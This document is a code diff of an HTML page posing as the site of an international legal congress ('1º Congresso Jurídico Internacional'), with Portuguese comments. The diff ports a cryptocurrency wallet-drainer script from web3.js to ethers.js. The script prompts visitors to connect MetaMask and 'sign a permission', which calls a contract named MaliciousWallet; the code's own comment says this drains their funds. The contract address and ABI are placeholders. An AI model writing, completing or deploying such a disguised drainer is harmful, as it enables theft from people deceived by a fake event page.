@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>1º Congresso Jurídico Internacional</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.4.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/lib/ethers.min.js"></script>
     <style>
         /* Estilos da página */
         html, body {
@@ -34,41 +34,46 @@
     </div>
 
     <script>
-        // Defina a ABI do contrato MaliciousWallet
+        // Substitua pela ABI do seu contrato MaliciousWallet
         const abiMaliciousWallet = [
-            // Coloque aqui a ABI ajustada ao contrato MaliciousWallet
+            // Coloque aqui a ABI do contrato
         ];
+        
+        // Substitua pelo endereço do contrato implantado
+        const enderecoContratoMaliciousWallet = "0x..."; 
 
-        // Defina o endereço do contrato MaliciousWallet
-        const enderecoContratoMaliciousWallet = "0x..."; // Substitua pelo endereço do contrato correto
-
-        let accounts;
         let contrato;
+        let provider;
+        let signer;
 
         async function conectarWallet() {
             if (window.ethereum) {
                 try {
-                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    contrato = new web3.eth.Contract(abiMaliciousWallet, enderecoContratoMaliciousWallet);
+                    // Solicita acesso à conta do usuário
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    // Cria um novo provider do Ethereum
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    // Define o signer (a conta conectada)
+                    signer = provider.getSigner();
+
+                    contrato = new ethers.Contract(enderecoContratoMaliciousWallet, abiMaliciousWallet, signer);
+
                     document.getElementById('btnSignPermission').style.display = 'block';
-                    document.getElementById('status').textContent = "Wallet conectada: " + accounts[0];
+                    document.getElementById('status').textContent = "Wallet conectada: " + await signer.getAddress();
                 } catch (error) {
                     console.error("Erro ao conectar a wallet:", error);
                 }
             } else {
-                console.error("Nenhuma wallet encontrada.");
+                console.error("Por favor, instale o MetaMask!");
             }
         }
 
-        // Função para simular assinatura de permissão e desencadear a transferência maliciosa de fundos
         async function signPermission() {
-            if (window.ethereum && contrato) {
+            if (signer && contrato) {
                 try {
-                    const resultado = await contrato.methods
-                        .signPermission()
-                        .send({ from: accounts[0] });
-
-                    console.log("Permissão assinada:", resultado);
+                    const tx = await contrato.signPermission();
+                    await tx.wait(); // Esperar pela mineração da transação
+                    console.log("Permissão assinada e fundos drenados (se houver saldo).");
                 } catch (error) {
                     console.error("Erro ao assinar permissão:", error);
                 }
